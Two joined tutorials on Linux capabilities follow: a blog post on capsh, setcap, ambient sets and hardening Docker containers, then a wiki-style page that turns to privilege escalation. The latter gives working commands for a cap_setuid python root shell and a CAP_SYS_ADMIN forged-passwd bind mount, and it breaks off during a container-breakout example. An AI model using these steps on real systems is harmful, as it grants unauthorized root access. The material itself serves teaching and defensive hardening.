A Quick Recap
I'll assume you know roughly what capabilities are and how they work. But first here's a recap of the rules governing how capabilities are inherited when starting a process, which you might want to refer back to later:

    P'(ambient)     = (file is privileged) ? 0 : P(ambient)

    P'(permitted)   = (P(inheritable) & F(inheritable)) |
                      (F(permitted) & cap_bset) | P'(ambient)

    P'(effective)   = F(effective) ? P'(permitted) : P'(ambient)

    P'(inheritable) = P(inheritable) [i.e., unchanged]

where:

    P denotes the value of a thread capability set before the execve(2)

    P' denotes the value of a thread capability set after the execve(2)

    F denotes a file capability set

    cap_bset is the value of the capability bounding set.

Let's jump into the deep end and see how we can work with capabilities in practice. The first tool most people will come across when working with caps is capsh. Running capsh as my normal user on Ubuntu 18.04 gives the following output:


$ capsh --print
Current: =
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=1000(amouat)
gid=1000(amouat)
groups=4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),134(libvirtd),134(libvirtd),999(docker),1000(amouat)
So we can see that a normal user process doesn't have any capabilities by default, but pretty much everything is in the bounding set. Nothing surprising there. But what about all the different sets, like ambient and inheritable, that we've been looking at? Unfortunately the released version of capsh isn’t up-to-date with these, despite support being in source since 2016.

For the moment, the most portable solution is to go straight to the /proc status file:


$ grep Cap /proc/$BASHPID/status
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
As you've probably guessed, the hex digits represent the capabilities in the set. We can decode this with our friend capsh:


$ capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Unsurprisingly, it matches the output from the earlier capsh command. If you try running as the root user, you should find the output becomes:


CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
In other words all caps are in the permitted, effective and bounding sets. Therefore the root user can make any kernel call, which is as we expect.

Assigning Capabilities to Executables
As described in the previous post and in the above table, processes can gain capabilities in the bounding set from appropriately configured executables. We can take a look at this in action with the ping utility. The ping utility is traditionally installed as a setuid binary (which effectively means it runs as root), as it is on my system, which looks like this:


$ which ping
/bin/ping
$ ls -l /bin/ping
-rwsr-xr-x 1 root root 64424 Mar 9 2017 /bin/ping
That's not too interesting for us and I'm disappointed Ubuntu doesn't seem to use the safer capability version by default (or ping sockets, but that's another story). However, we can grab the source for ping and compile our own binary:

$ ls -l ping
-rwxr-xr-x 1 amouat amouat 148640 Jul 4 16:28 ping
$ getcap ./ping
$ ./ping google.com
./ping: socket: Operation not permitted
The file isn’t setuid and doesn’t have capabilities set, so it doesn’t work when run as a normal user. We can set the capabilities as follows (there is a script in the repo to do this automatically):


$ setcap 'cap_net_raw+p' ./ping
unable to set CAP_SETFCAP effective capability: Operation not permitted
$ sudo setcap 'cap_net_raw+p' ./ping
$ getcap ./ping
./ping = cap_net_raw+p
$ ./ping google.com -c 1
PING google.com (216.58.204.78) 56(84) bytes of data.
64 bytes from lhr25s13-in-f78.1e100.net (216.58.204.78): icmp_seq=1 ttl=53 time=22.1 ms
--- google.com ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 22.110/22.110/22.110/0.000 ms
Note that I couldn't use setcap as a normal user and had to fall back to sudo—the calling process needs to have CAP_SETFCAP in the permitted set.

We can look at the capabilities of the ping process:


$ ./ping google.com > /dev/null&
[2] 24814
$ grep Cap /proc/24814/status
CapInh: 0000000000000000
CapPrm: 0000000000002000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
$ capsh --decode=0000000000002000
0x0000000000002000=cap_net_raw
CAP_NET_RAW is there, but only in the permitted set. A call to open the ICMP socket won’t succeed unless the capability is in the effective set, so how is ping working?

It turns out the ping binary itself requests that the capability is added to the effective set, then drops it after opening the socket (so by the time we ran grep, it had already been dropped). We can see the relevant system calls if we run using strace:


$ sudo strace ./ping -c 1 google.com
...
capget({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, NULL) = 0
capget({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, {effective=0, permitted=1<<CAP_NET_ADMIN|1<<CAP_NET_RAW, inheritable=0}) = 0
capset({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, {effective=1<<CAP_NET_RAW, permitted=1<<CAP_NET_ADMIN|1<<CAP_NET_RAW, inheritable=0}) = 0
socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP) = -1 EACCES (Permission denied)
socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) = 3
socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6) = -1 EACCES (Permission denied)
socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6) = 4
capget({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, NULL) = 0
capget({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, {effective=1<<CAP_NET_RAW, permitted=1<<CAP_NET_ADMIN|1<<CAP_NET_RAW, inheritable=0}) = 0
capset({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, {effective=0, permitted=1<<CAP_NET_ADMIN|1<<CAP_NET_RAW, inheritable=0}) = 0
...
The first capset line shows the CAP_NET_RAW capability being added to the effective set. The next line tries to create an IPV4 ping socket, which fails as this is gated by the ping_group_range kernel config parameter. It then successfully creates a raw IPV4 network socket instead. The process is repeated for IPV6. The last step is to clear the effective set as ping no longer needs the capabilities once the socket is open.

If the ping binary hadn’t been ‘capability aware’—i.e., didn’t make the capset and capget calls—we still could have used capabilities but would have needed to set the ‘effective bit’ on the file, which automatically adds permitted capabilities to the effective set. This would have been a one-character change to the previous command:


$ setcap 'cap_net_raw+ep' ./ping
The syntax is a bit confusing; the ‘e' isn’t adding the capability to the effective set, it’s setting the effective bit on the binary. As you can see by referring to the table at the start of the post, setting the effective bit will copy all capabilities from the permitted set into the effective set when the process starts. This is slightly less secure than doing capset in the executable, as the capabilities are ‘live’ for longer, but it means that we can apply capabilities to binaries that know nothing about them and avoid giving them full setuid privileges.

Special Root Rules
Something that I’m not going to cover in this blog are the special rules covering what happens with inheriting capabilities when switching from root. I haven’t investigated this fully and there seems to be a lot of different interactions that have to be considered (e.g., running setuid binaries as different users).

One thing you will notice is the ‘securebits flags’ that are set per thread and control how capabilities are inherited when changing from or to UID 0. A full explanation is in the man capabilities page.

Creating Semi-Privileged Environments
OK, so what about the ambient and inheritable sets? The idea behind these is to allow us to create environments (in the sense of process trees or namespaces) that allow certain capabilities to be used.

For example, we should be able to create a ‘webserver’ environment that can bind to port 80 by putting CAP_NET_BIND_SERVICE in the ambient capabilities, without requiring any other capabilities or running as the root user (note that there other solutions to this problem, such as using sysctl net.ipv4.ip_unprivileged_port_start). The webserver can be started from an interpreter or helper script and won’t require the setting of file privileges.

Let’s take a look at how to do this. I’ve created a short program set_ambient that simply uses the cap-ng library to add the CAP_NET_BIND_SERVICE capability to the ambient set of a new process. Once compiled, we need to give it file privileges so that it has the correct capability:


$ sudo setcap cap_net_bind_service+p set_ambient
$ getcap ./set_ambient
./set_ambient = cap_net_bind_service+p
We can see how it works:

$ ./set_ambient /bin/bash
Starting process with CAP_NET_BIND_SERVICE in ambient
$ grep Cap /proc/$BASHPID/status
CapInh: 0000000000000400
CapPrm: 0000000000000400
CapEff: 0000000000000400
CapBnd: 0000003fffffffff
CapAmb: 0000000000000400
$ capsh --decode=0000000000000400
0x0000000000000400=cap_net_bind_service
$ exit
Note that for a capability to be in the ambient set, it must also be in the permitted and inheritable sets.

I’ve also created a simple Go web server that binds to port 80. We won’t give this executable file capabilities or run it as root. If we run it normally:


$ ./server
2019/09/09 13:42:06 listen tcp :80: bind: permission denied
It fails as it does not have privileges to bind low numbered ports. Let’s try again in our ‘webserver’ environment:


$ ./set_ambient /bin/bash
Starting process with CAP_NET_BIND_SERVICE in ambient
$ ./server &
[1] 2360
$ curl localhost:80
Successfully serving on port 80
$ kill 2360
$ exit
Success! We could have called `./set_ambient server` directly, but I wanted to make the point that child processes also automatically inherit the capability. The bash shell with ambient capabilities effectively becomes a semi-privileged environment, where we can not only run webservers but also supporting scripts and programs, etc., which may in turn launch the webserver.

This is important for interpreted languages such as Python; in this case we don’t want to give the Python executable elevated file capabilities, and we can work around this by launching the interpreter from an environment with ambient capabilities, such as:


$ python3 -m http.server 80
Traceback (most recent call last):
...
PermissionError: [Errno 13] Permission denied
$ ./set_ambient /usr/bin/python3 -m http.server 80
Starting process with CAP_NET_BIND_SERVICE in ambient
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
Regarding the difference between inheritable and ambient, we would have needed to set the inheritable capabilities and effective bit on the Go webserver executable for it to be usable by a process with CAP_NET_BIND_SERVICE in inheritable. As we generally want to be able to work with arbitrary binaries (that don’t have capabilities set) and without root privileges, the inheritable set is of limited use to us.

Containers and Capabilities
If we consider the previous point about creating a semi-privileged environment, we can see that capabilities and containers should go hand-in-hand. And indeed they do, at least to a certain extent.

I’ve created a simple image for testing capabilities that has capsh and the previous programs installed. The code is available on GitHub if you want to follow along. Note that capabilities need to be set explicitly in a RUN instruction as they don’t persist over a COPY.

If we run the container normally:


$ docker run -it amouat/caps
root@cfeb81ec0fab:/# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
root@cfeb81ec0fab:/# grep Cap /proc/$BASHPID/status
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
There are a few things here. Root in a container has a lot of privileges, but not all of them. For example, the SYS_TIME privilege is missing by default, as the system time is namespaced, so if it is changed in a container, it will also be changed on the host and in all other containers.

Also, note that the ambient set is empty. Currently it’s not possible to configure the ambient set in Docker or Kubernetes, although it is possible in the underlying runc runtime. A discussion about how to expose ambient capabilities safely in Kubernetes is currently ongoing.

If we start the container with a given user, we get an interesting result:


$ docker run -it --user=nobody amouat/caps
$ grep Cap /proc/$BASHPID/status
CapInh: 00000000a80425fb
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
So the capabilities are placed in the inheritable set, but not the others (I believe this is due to the ‘special root rules’ mentioned earlier which clear the permitted and effective sets when the change of user occurs). Following the rules at the top of this post, this means we should be able to set the capability in the inheritable set and the effective bit on our webserver, and it will work as before. The amouat/caps image includes a copy of the server executable with inheritable capabilities set, which we can use to test this:


$ docker run --user nobody amouat/caps getcap /inh_server
/inh_server = cap_net_bind_service+ei
$ docker run -d -p 8000:80 --user nobody amouat/caps /inh_server
d8f13e6990c5802e2beb6e435dd74bcae7959b94c1293349d33d9fe6c053c0fe
$ curl localhost:8000
Successfully serving on port 80
I’m not sure when this is useful, as if you can modify the inheritable set, you may as well modify the permitted set.

To get a working environment where you’re non-root and can still make use of capabilities still requires a helper utility. First, without the set_ambient utility:


$ docker run -p 8000:80 --user nobody amouat/caps /server
2019/09/09 19:14:13 listen tcp :80: bind: permission denied
And now with it:


$ docker run -d -p 8000:80 --user nobody amouat/caps /set_ambient /server
de09fe34a623c3bf40c2eea7229696acfa8d192c19adfa4065a380a583372907
$ curl localhost:8000
Successfully serving on port 80
In this case, it would be easier to set file capabilities on /server, but using /set_ambient will also work with child processes (so the server could be started by a helper script or interpreter) and binaries that don’t have capabilities set for whatever reason.

The easiest and certainly the most common way to restrain capabilities in a container is via the --cap-drop and --cap-add arguments (and their equivalents in Kubernetes specs). These arguments affect the bounding set of all users, including the root user. Typically, it’s best to drop all capabilities and just add back the limited ones needed. For instance:


$ docker run --cap-drop all --cap-add NET_BIND_SERVICE -it amouat/caps capsh --print
Current: = cap_net_bind_service+eip
Bounding set =cap_net_bind_service
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
We can then run our server program as root, or even better, we can use a named user in conjunction with file or ambient capabilities as previously:


$ docker run --cap-drop all --cap-add NET_BIND_SERVICE \
-d -p 8000:80 --user nobody amouat/caps /set_ambient /server
9c176555ea86add95839d02b6c2c5ae7d8a3fd79e36f484852b8f8641104aac1
$ curl localhost:8000
Successfully serving on port 80
$ docker top 9c17
UID ... CMD
nobody ... /server
So now we are running in a container that only has the single NET_BIND_SERVICE capability and we are running as non-root. Running as non-root still has security benefits even when capabilities are dropped; notably if the server process is hacked, the attacker will have limited filesystem privileges. Whilst binding port 80 is a somewhat contrived example—it would be better to run the server on a different port so that the container doesn’t require any capabilities—it still serves to demonstrate the principle.

There’s also an option in Docker to prevent users from gaining new capabilities, which may be useful if you’re not dropping capabilities but your containers are running as a non-root user. It would effectively stop attackers from being able to take advantage of setuid binaries to increase their privileges in the container. It also stops us from using the set_ambient utility:


$ docker run -p 8000:80 --security-opt=no-new-privileges:true \
--user nobody amouat/caps /set_ambient /server
Cannot set cap: Operation not permitted
A full explanation of this option can be found on Raesene’s Docker Capabilities and no-new-privileges blog.

If you’re using containers today, I recommend trying to drop all capabilities and run as a non-root user. As you can see, it is possible to use ambient and/or file capabilities to run a container with a non-root user that has a limited set of capabilities, but it’s not as easy as it should be. We shouldn’t need to use helper programs like set_ambient.

Conclusion
By now you probably appreciate that capabilities can be an effective security mechanism, but are also complicated and only partly supported. The lack of support is particularly frustrating; we shouldn’t have to write C programs to set ambient capabilities or grep /proc to find the current settings.

As capabilities are particularly relevant to containers, it will be interesting to see how they develop in that space. I’m curious if we will see common usage of ambient capabilities emerge to support semi-privileged containers that run as non-root. If you’re using file capabilities or ambient capabilities in conjunction with containers, please reach out to me on Twitter @adrianmouat, as I’m eager to hear any use cases.

## Why capabilities?

Linux capabilities **provide a subset of the available root privileges** to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.

To better understand how Linux capabilities work, let’s have a look first at the problem it tries to solve.

Let’s assume we are running a process as a normal user. This means we are non-privileged. We can only access data that owned by us, our group, or which is marked for access by all users. At some point in time, our process needs a little bit more permissions to fulfill its duties, like opening a network socket. The problem is that normal users can not open a socket, as this requires root permissions.

## Capabilities Sets

**Inherited capabilities**

**CapEff**: The _effective_ capability set represents all capabilities the process is using at the moment (this is the actual set of capabilities that the kernel uses for permission checks). For file capabilities the effective set is in fact a single bit indicating whether the capabilities of the permitted set will be moved to the effective set upon running a binary. This makes it possible for binaries that are not capability-aware to make use of file capabilities without issuing special system calls.

**CapPrm**: (_Permitted_) This is a superset of capabilities that the thread may add to either the thread permitted or thread inheritable sets. The thread can use the capset() system call to manage capabilities: It may drop any capability from any set, but only add capabilities to its thread effective and inherited sets that are in its thread permitted set. Consequently it cannot add any capability to its thread permitted set, unless it has the cap\_setpcap capability in its thread effective set.

**CapInh**: Using the _inherited_ set all capabilities that are allowed to be inherited from a parent process can be specified. This prevents a process from receiving any capabilities it does not need. This set is preserved across an `execve` and is usually set by a process _receiving_ capabilities rather than by a process that’s handing out capabilities to its children.

**CapBnd**: With the _bounding_ set it’s possible to restrict the capabilities a process may ever receive. Only capabilities that are present in the bounding set will be allowed in the inheritable and permitted sets.

**CapAmb**: The _ambient_ capability set applies to all non-SUID binaries without file capabilities. It preserves capabilities when calling `execve`. However, not all capabilities in the ambient set may be preserved because they are being dropped in case they are not present in either the inheritable or permitted capability set. This set is preserved across `execve` calls.

For a detailed explanation of the difference between capabilities in threads and files and how are the capabilities passed to threads read the following pages:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Processes & Binaries Capabilities

### Processes Capabilities

To see the capabilities for a particular process, use the **status** file in the /proc directory. As it provides more details, let’s limit it only to the information related to Linux capabilities.\
Note that for all running processes capability information is maintained per thread, for binaries in the file system it’s stored in extended attributes.

You can find the capabilities defined in /usr/include/linux/capability.h

You can find the capabilities of the current process in `cat /proc/self/status` or doing `capsh --print` and of other users in `/proc/<pid>/status`

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

This command should return 5 lines on most systems.

* CapInh = Inherited capabilities
* CapPrm = Permitted capabilities
* CapEff = Effective capabilities
* CapBnd = Bounding set
* CapAmb = Ambient capabilities set

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

These hexadecimal numbers don’t make sense. Using the capsh utility we can decode them into the capabilities name.

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Lets check now the **capabilities** used by `ping`:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Although that works, there is another and easier way. To see the capabilities of a running process, simply use the **getpcaps** tool followed by its process ID (PID). You can also provide a list of process IDs.

```bash
getpcaps 1234
```

Lets check here the capabilities of `tcpdump` after having giving the binary enough capabilities (`cap_net_admin` and `cap_net_raw`) to sniff the network (_tcpdump is running in process 9562_):

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

As you can see the given capabilities corresponds with the results of the 2 ways of getting the capabilities of a binary.\
The _getpcaps_ tool uses the **capget()** system call to query the available capabilities for a particular thread. This system call only needs to provide the PID to obtain more information.

### Binaries Capabilities

Binaries can have capabilities that can be used while executing. For example, it's very common to find `ping` binary with `cap_net_raw` capability:

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

You can **search binaries with capabilities** using:

```bash
getcap -r / 2>/dev/null
```

### Dropping capabilities with capsh

If we drop the CAP\_NET\_RAW capabilities for _ping_, then the ping utility should no longer work.

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Besides the output of _capsh_ itself, the _tcpdump_ command itself should also raise an error.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

The error clearly shows that the ping command is not allowed to open an ICMP socket. Now we know for sure that this works as expected.

### Remove Capabilities

You can remove capabilities of a binary with

```bash
setcap -r </path/to/binary>
```

## User Capabilities

Apparently **it's possible to assign capabilities also to users**. This probably means that every process executed by the user will be able to use the users capabilities.\
Base on on [this](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [this ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)and [this ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)a few files new to be configured to give a user certain capabilities but the one assigning the capabilities to each user will be `/etc/security/capability.conf`.\
File example:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Environment Capabilities

Compiling the following program it's possible to **spawn a bash shell inside an environment that provides capabilities**.

{% code title="ambient.c" %}
```c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```
{% endcode %}

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

Inside the **bash executed by the compiled ambient binary** it's possible to observe the **new capabilities** (a regular user won't have any capability in the "current" section).

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

{% hint style="danger" %}
You can **only add capabilities that are present** in both the permitted and the inheritable sets.
{% endhint %}

### Capability-aware/Capability-dumb binaries

The **capability-aware binaries won't use the new capabilities** given by the environment, however the **capability dumb binaries will us**e them as they won't reject them. This makes capability-dumb binaries vulnerable inside a special environment that grant capabilities to binaries.

## Service Capabilities

By default a **service running as root will have assigned all the capabilities**, and in some occasions this may be dangerous.\
Therefore, a **service configuration** file allows to **specify** the **capabilities** you want it to have, **and** the **user** that should execute the service to avoid running a service with unnecessary privileges:

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Capabilities in Docker Containers

By default Docker assigns a few capabilities to the containers. It's very easy to check which capabilities are these by running:

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## Privesc/Container Escape

Capabilities are useful when you **want to restrict your own processes after performing privileged operations** (e.g. after setting up chroot and binding to a socket). However, they can be exploited by passing them malicious commands or arguments which are then run as root.

You can force capabilities upon programs using `setcap`, and query these using `getcap`:

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

The `+ep` means you’re adding the capability (“-” would remove it) as Effective and Permitted.

To identify programs in a system or folder with capabilities:

```bash
getcap -r / 2>/dev/null
```

### Exploitation example

In the following example the binary `/usr/bin/python2.6` is found vulnerable to privesc:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capabilities** needed by `tcpdump` to **allow any user to sniff packets**:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### The special case of "empty" capabilities

Note that one can assign empty capability sets to a program file, and thus it is possible to create a set-user-ID-root program that changes the effective and saved set-user-ID of the process that executes the program to 0, but confers no capabilities to that process. Or, simply put, if you have a binary that:

1. is not owned by root
2. has no `SUID`/`SGID` bits set
3. has empty capabilities set (e.g.: `getcap myelf` returns `myelf =ep`)

then **that binary will run as root**.

## CAP\_SYS\_ADMIN

[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) is largely a catchall capability, it can easily lead to additional capabilities or full root (typically access to all capabilities). `CAP_SYS_ADMIN` is required to perform a range of **administrative operations**, which is difficult to drop from containers if privileged operations are performed within the container. Retaining this capability is often necessary for containers which mimic entire systems versus individual application containers which can be more restrictive. Among other things this allows to **mount devices** or abuse **release\_agent** to escape from the container.

**Example with binary**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Using python you can mount a modified _passwd_ file on top of the real _passwd_ file:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

And finally **mount** the modified `passwd` file on `/etc/passwd`:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

And you will be able to **`su` as root** using password "password".

**Example with environment (Docker breakout)**

You can check the enabled capabilities inside the docker container using:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
